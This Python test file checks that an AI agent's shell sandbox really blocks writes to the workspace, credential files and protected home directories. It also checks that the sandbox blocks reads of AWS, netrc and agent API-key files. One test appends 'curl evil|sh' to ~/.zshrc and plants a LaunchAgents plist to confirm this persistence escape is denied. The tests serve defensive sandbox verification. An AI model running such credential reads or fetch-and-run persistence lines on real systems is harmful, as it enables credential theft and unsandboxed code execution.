"""Backend conformance: the same rights assertions, whatever enforces them.

These tests do not read a profile or inspect a rule table.  They spawn a real
sandboxed child and ask the operating system what it will actually let that
child do.  That makes them the only assertions in the suite that survive a
change of backend — and therefore the real test of whether the backend seam
holds.  A second backend earns its place by turning this file green on its
platform, with no assertion edited.

The skip below is deliberately phrased against *any* backend rather than
against seatbelt by name.  On a host with no enforcing sandbox these skip
rather than fail, because `build_sandbox_command` fails closed there and
there is no enforcement to conform to.

Seatbelt-specific tests — profile text, the `.sb` cache key — stay in
`test_filesystem_sandbox.py`.  They assert *how* macOS is told, which is
exactly what another backend is free to do differently.
"""

import os
import subprocess
from pathlib import Path

import pytest

from agent.security.sandbox import (
    ShellSandboxRequest,
    build_sandbox_command,
    detect_sandbox_support,
)

#: Named so a failure report says which backend produced it.
BACKEND = detect_sandbox_support()

_NEEDS_SANDBOX = pytest.mark.skipif(
    BACKEND is None,
    reason="no enforcing filesystem sandbox on this host",
)


def _request(
    tmp_path,
    *,
    workspace_read=True,
    workspace_write=False,
    write_scope=(),
    mode="read_all",
    devices=True,
    home_dir=None,
    extra_secret_paths=(),
    agent_home=None,
):
    workspace = tmp_path / "workspace"
    output = tmp_path / "output"
    return ShellSandboxRequest(
        workspace_root=workspace,
        output_root=output,
        workspace_read=workspace_read,
        workspace_write=workspace_write,
        write_scope=tuple(write_scope),
        scratch_dir=output / "sandbox" / "tmp",
        mode=mode,
        devices=devices,
        home_dir=home_dir or (tmp_path / "home"),
        extra_secret_paths=tuple(extra_secret_paths),
        agent_home=agent_home,
    )


def _run_in_sandbox(request: ShellSandboxRequest, command: str):
    sandbox = build_sandbox_command(request)
    env = dict(os.environ)
    env.update(sandbox.env_updates)
    request.output_root.mkdir(parents=True, exist_ok=True)
    return subprocess.run(
        [*sandbox.argv_prefix, "/bin/sh", "-c", command],
        env=env,
        cwd=request.output_root,
        capture_output=True,
        text=True,
        timeout=20,
    )


def test_a_backend_is_named_when_one_is_available():
    """Guards against the whole file silently skipping itself into green."""
    import sys

    if sys.platform == "darwin":
        assert BACKEND == "darwin-sandbox-exec", (
            "macOS should always have an enforcing backend; a skip here would "
            "hide every conformance assertion below"
        )


@_NEEDS_SANDBOX
def test_sandbox_blocks_workspace_write_by_default(tmp_path):
    request = _request(tmp_path)
    request.workspace_root.mkdir()
    target = request.workspace_root / "new.txt"

    result = _run_in_sandbox(request, f"touch {target}")

    assert result.returncode != 0
    assert not target.exists()


@_NEEDS_SANDBOX
def test_sandbox_allows_output_writes(tmp_path):
    request = _request(tmp_path)
    request.output_root.mkdir()
    target = request.output_root / "made.txt"

    result = _run_in_sandbox(request, f"touch {target}")

    assert result.returncode == 0, result.stderr
    assert target.exists()


@_NEEDS_SANDBOX
def test_sandbox_allows_writes_to_user_cache_dirs(tmp_path):
    request = _request(tmp_path, home_dir=tmp_path / "home")
    cache = request.home_dir / ".npm"
    cache.mkdir(parents=True)
    target = cache / "cache-write-test"

    result = _run_in_sandbox(request, f"touch {target}")

    assert result.returncode == 0, result.stderr
    assert target.exists()


@_NEEDS_SANDBOX
def test_sandbox_allows_writes_to_application_support(tmp_path):
    import shlex

    request = _request(tmp_path, home_dir=tmp_path / "home")
    app_support = request.home_dir / "Library" / "Application Support"
    app_support.mkdir(parents=True)
    target = app_support / "app-state-write-test"

    result = _run_in_sandbox(request, f"touch {shlex.quote(str(target))}")

    assert result.returncode == 0, result.stderr
    assert target.exists()


@_NEEDS_SANDBOX
def test_sandbox_keeps_home_documents_read_only(tmp_path):
    request = _request(tmp_path, home_dir=tmp_path / "home")
    documents = request.home_dir / "Documents"
    documents.mkdir(parents=True)
    target = documents / "secret.txt"

    result = _run_in_sandbox(request, f"touch {target}")

    assert result.returncode != 0
    assert not target.exists()


@_NEEDS_SANDBOX
def test_sandbox_denies_credentials_and_reopens_scoped_workspace(tmp_path):
    """write_scope reopens paths even inside a protected user-data root."""
    home = tmp_path / "home"
    workspace = home / "Desktop" / "ws"
    workspace.mkdir(parents=True)
    (workspace / "src").mkdir()
    output = tmp_path / "output"
    request = ShellSandboxRequest(
        workspace_root=workspace,
        output_root=output,
        workspace_read=True,
        workspace_write=False,
        write_scope=("src",),
        scratch_dir=output / "sandbox" / "tmp",
        home_dir=home,
    )
    output.mkdir(parents=True, exist_ok=True)

    credentials = home / ".ssh"
    credentials.mkdir(parents=True)
    credential_target = credentials / "id_rsa"
    scoped_target = workspace / "src" / "ok.txt"
    desktop_target = home / "Desktop" / "other" / "no.txt"

    result = _run_in_sandbox(
        request,
        (
            f"touch {credential_target}; echo CRED=$?; "
            f"touch {scoped_target}; echo SCOPED=$?; "
            f"mkdir -p {desktop_target.parent}; touch {desktop_target}; "
            "echo DESKTOP=$?"
        ),
    )

    assert "CRED=1" in result.stdout
    assert "SCOPED=0" in result.stdout
    assert "DESKTOP=1" in result.stdout
    assert credential_target.exists() is False
    assert scoped_target.exists() is True
    assert desktop_target.exists() is False


@_NEEDS_SANDBOX
def test_sandbox_allows_workspace_reads(tmp_path):
    request = _request(tmp_path)
    request.workspace_root.mkdir()
    source = request.workspace_root / "a.txt"
    source.write_text("secret", encoding="utf-8")

    result = _run_in_sandbox(request, f"cat {source}")

    assert result.returncode == 0, result.stderr
    assert "secret" in result.stdout


@_NEEDS_SANDBOX
def test_sandbox_read_all_mode_reads_outside_workspace(tmp_path):
    request = _request(tmp_path, mode="read_all")
    request.output_root.mkdir()
    outside = tmp_path / "outside.txt"
    outside.write_text("home-secret", encoding="utf-8")

    result = _run_in_sandbox(request, f"cat {outside}")

    assert result.returncode == 0, result.stderr
    assert "home-secret" in result.stdout


@_NEEDS_SANDBOX
def test_sandbox_restricted_mode_blocks_outside_reads(tmp_path):
    request = _request(tmp_path, mode="restricted")
    request.output_root.mkdir()
    outside = tmp_path / "outside.txt"
    outside.write_text("home-secret", encoding="utf-8")

    result = _run_in_sandbox(request, f"cat {outside}")

    assert result.returncode != 0
    assert "home-secret" not in result.stdout


@_NEEDS_SANDBOX
def test_sandbox_denies_workspace_reads_when_read_disabled(tmp_path):
    # "workspace reads disabled" is a restricted-mode policy; read_all mode
    # intentionally opens reads everywhere, so this must use restricted.
    request = _request(tmp_path, workspace_read=False, mode="restricted")
    request.workspace_root.mkdir()
    source = request.workspace_root / "a.txt"
    source.write_text("secret", encoding="utf-8")

    result = _run_in_sandbox(request, f"cat {source}")

    assert result.returncode != 0


@_NEEDS_SANDBOX
def test_sandbox_allows_only_scoped_workspace_writes(tmp_path):
    request = _request(
        tmp_path, workspace_write=False, write_scope=["src/app.py"]
    )
    (request.workspace_root / "src").mkdir(parents=True)
    allowed = request.workspace_root / "src" / "app.py"
    denied = request.workspace_root / "other.txt"

    ok = _run_in_sandbox(request, f"touch {allowed}")
    assert ok.returncode == 0, ok.stderr
    assert allowed.exists()

    bad = _run_in_sandbox(request, f"touch {denied}")
    assert bad.returncode != 0
    assert not denied.exists()


@_NEEDS_SANDBOX
def test_sandbox_opens_host_temp_and_denies_internal_output(tmp_path):
    request = _request(tmp_path)
    request.output_root.mkdir()
    internal = request.output_root / ".simple-internal" / "locks"
    internal.mkdir(parents=True)

    host_tmp = _run_in_sandbox(request, "touch /tmp/simple-sandbox-test")
    assert host_tmp.returncode == 0, host_tmp.stderr
    assert Path("/tmp/simple-sandbox-test").exists()
    Path("/tmp/simple-sandbox-test").unlink(missing_ok=True)

    internal_tmp = request.output_root / ".simple-internal" / "probe"
    internal_write = _run_in_sandbox(request, f"touch {internal_tmp}")
    assert internal_write.returncode != 0
    assert not internal_tmp.exists()


@_NEEDS_SANDBOX
def test_sandbox_enforces_rule_in_child_processes(tmp_path):
    request = _request(tmp_path)
    request.workspace_root.mkdir()
    target = request.workspace_root / "child.txt"

    result = _run_in_sandbox(
        request,
        f"(touch {target}) ; wait ; echo done",
    )

    assert not target.exists()
    assert "Operation not permitted" in result.stderr

@_NEEDS_SANDBOX
def test_sandbox_blocks_writes_through_a_relocated_documents_dir(tmp_path):
    """The OS-enforced version of the invariant above."""
    real_tmp = Path(tmp_path).resolve()
    home = real_tmp / "home"
    home.mkdir(exist_ok=True)
    external = real_tmp / "external" / "Docs"
    external.mkdir(parents=True, exist_ok=True)
    (home / "Documents").symlink_to(external)
    secret = external / "tax.txt"
    secret.write_text("secret", encoding="utf-8")

    request = _request(tmp_path, home_dir=home)

    # Through the symlink...
    via_link = _run_in_sandbox(request, f"echo pwned > {home / 'Documents' / 'tax.txt'}")
    assert via_link.returncode != 0
    assert secret.read_text(encoding="utf-8") == "secret"

    # ...and through the canonical path.
    via_real = _run_in_sandbox(request, f"echo pwned > {secret}")
    assert via_real.returncode != 0
    assert secret.read_text(encoding="utf-8") == "secret"


@_NEEDS_SANDBOX
def test_sandbox_denies_writes_to_protected_credential_files(tmp_path):
    """subpath does match a regular file, so credential files are covered."""
    real_tmp = Path(tmp_path).resolve()
    home = real_tmp / "home"
    home.mkdir(exist_ok=True)
    netrc = home / ".netrc"
    netrc.write_text("machine example login me", encoding="utf-8")

    request = _request(tmp_path, home_dir=home)
    result = _run_in_sandbox(request, f"echo pwned > {netrc}")

    assert result.returncode != 0
    assert netrc.read_text(encoding="utf-8") == "machine example login me"

@_NEEDS_SANDBOX
def test_sandbox_denies_reading_credentials(tmp_path):
    """Write protection alone is useless for a credential.

    The damaging act is reading the key and shipping it out over the network
    the profile leaves wide open, so the read rule is the load-bearing one.
    """
    real_tmp = Path(tmp_path).resolve()
    home = real_tmp / "home"
    (home / ".aws").mkdir(parents=True)
    creds = home / ".aws" / "credentials"
    creds.write_text("aws_secret_access_key = hunter2", encoding="utf-8")
    netrc = home / ".netrc"
    netrc.write_text("machine example login me password pw", encoding="utf-8")

    request = _request(tmp_path, home_dir=home)
    result = _run_in_sandbox(
        request, f"cat {creds}; echo AWS=$?; cat {netrc}; echo NETRC=$?"
    )

    assert "AWS=1" in result.stdout
    assert "NETRC=1" in result.stdout
    assert "hunter2" not in result.stdout
    assert "password pw" not in result.stdout


@_NEEDS_SANDBOX
def test_sandbox_keeps_ssh_readable_by_default(tmp_path):
    """`.ssh` is credential material but stays readable unless opted in.

    Denying it by default breaks `git push` over SSH, and a default that
    breaks git just gets switched off wholesale.  `shell_secret_paths` is
    the opt-in for sessions that do not need it.
    """
    real_tmp = Path(tmp_path).resolve()
    home = real_tmp / "home"
    (home / ".ssh").mkdir(parents=True)
    key = home / ".ssh" / "id_rsa"
    key.write_text("PRIVATE", encoding="utf-8")

    default = _run_in_sandbox(_request(tmp_path, home_dir=home), f"cat {key}")
    assert default.returncode == 0
    assert "PRIVATE" in default.stdout

    opted_in = _run_in_sandbox(
        _request(tmp_path, home_dir=home, extra_secret_paths=(".ssh",)),
        f"cat {key}",
    )
    assert opted_in.returncode != 0
    assert "PRIVATE" not in opted_in.stdout


@_NEEDS_SANDBOX
def test_sandbox_denies_writes_to_shell_rc_files(tmp_path):
    """A writable ~/.zshrc turns a sandboxed write into unsandboxed exec.

    This is the actual escape from a write sandbox: not defeating seatbelt,
    but leaving a line for the user's next login shell to run.
    """
    real_tmp = Path(tmp_path).resolve()
    home = real_tmp / "home"
    home.mkdir(exist_ok=True)
    zshrc = home / ".zshrc"
    zshrc.write_text("# mine\n", encoding="utf-8")

    request = _request(tmp_path, home_dir=home)
    result = _run_in_sandbox(
        request,
        f"echo 'curl evil|sh' >> {zshrc}; echo RC=$?; "
        f"mkdir -p {home / 'Library' / 'LaunchAgents'}; "
        f"touch {home / 'Library' / 'LaunchAgents' / 'evil.plist'}; echo LA=$?",
    )

    assert "RC=1" in result.stdout
    assert "LA=1" in result.stdout
    assert zshrc.read_text(encoding="utf-8") == "# mine\n"


@_NEEDS_SANDBOX
def test_sandbox_denies_agent_home_but_reopens_output(tmp_path):
    """config.json holds provider API keys; output_dir lives inside it."""
    real_tmp = Path(tmp_path).resolve()
    agent_home = real_tmp / "agent-home"
    output = agent_home / "output"
    output.mkdir(parents=True)
    config = agent_home / "config.json"
    config.write_text('{"api_key": "sk-secret"}', encoding="utf-8")

    request = ShellSandboxRequest(
        workspace_root=real_tmp / "workspace",
        output_root=output,
        workspace_read=True,
        workspace_write=False,
        write_scope=(),
        scratch_dir=output / "sandbox" / "tmp",
        home_dir=real_tmp / "home",
        agent_home=agent_home,
    )
    result = _run_in_sandbox(
        request,
        f"cat {config}; echo CFG=$?; "
        f"touch {output / 'artifact.txt'}; echo OUT=$?",
    )

    assert "CFG=1" in result.stdout
    assert "sk-secret" not in result.stdout
    assert "OUT=0" in result.stdout
    assert (output / "artifact.txt").exists()

